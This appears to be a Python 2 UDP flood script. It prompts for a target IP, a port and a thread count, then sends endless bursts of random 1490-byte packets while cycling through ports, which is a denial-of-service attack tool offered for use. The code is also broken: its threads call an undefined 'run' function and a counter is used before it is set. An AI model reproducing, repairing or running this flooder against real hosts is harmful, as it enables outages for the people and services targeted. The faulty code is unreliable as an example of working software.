import sys
import os
import time
import socket
import random
import threading

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print
print
ip = raw_input("IP : ")
port = input("Port : ")
thread_num = input("Threads : ")

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
    
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s Packet To %s Throught Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
